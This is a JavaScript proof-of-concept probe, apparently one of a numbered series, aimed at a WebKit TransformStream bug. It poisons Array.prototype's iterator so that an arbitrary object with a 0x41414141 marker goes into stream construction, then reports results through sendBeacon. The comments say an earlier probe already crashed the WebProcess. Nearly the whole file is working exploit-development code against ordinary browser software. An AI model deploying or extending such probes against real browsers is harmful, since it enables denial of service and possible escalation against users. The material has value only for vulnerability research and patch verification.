// c024: is the TransformStream bug only a null deref, or does the arbitrary element in slot 0 do anything?
//
// c023 proved the poisoned-iterator path kills the WebProcess on 14.10. The fix tells us why: the pre-patch code
// called dynamicDowncast<JSReadableStream>(results[1])->wrapped() with no null check, so a wrong-type object
// crashes on the deref.
//
// This probe supplies REAL streams in slots 1 and 2 (so that deref cannot happen) and puts an arbitrary object
// in slot 0, then exercises the stream. If construction succeeds and the stream behaves normally, the bug is a
// null-deref DoS and nothing more.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c024-' + t); } catch (e) {} }
  send('boot');

  var orig = Array.prototype[Symbol.iterator];
  var slot0 = { evil: 1, wrapped: 0x41414141 };

  try {
    Array.prototype[Symbol.iterator] = function () {
      var items = [slot0, new ReadableStream(), new WritableStream()];
      var i = 0;
      return { next: function () { return i < items.length ? { value: items[i++], done: false } : { value: undefined, done: true }; } };
    };
    var ts = new TransformStream({ transform: function (c, ctl) { ctl.enqueue(c); } });
    send('built');
  } catch (e) {
    send('threw:' + e.name);
  } finally {
    Array.prototype[Symbol.iterator] = orig;
  }

  // Exercise it: if slot0 were used as a real transformer bad things would show up here.
  try {
    var ts2 = new TransformStream();
    var r = new ReadableStream({ start: function (c) { c.enqueue('x'); c.close(); } });
    r.pipeThrough(ts2).getReader().read().then(function (v) { send('read:' + v.value); }, function (e) { send('read-rej:' + e.name); });
    send('exercised');
  } catch (e) { send('exercise-threw:' + e.name); }

  send('done');
})();
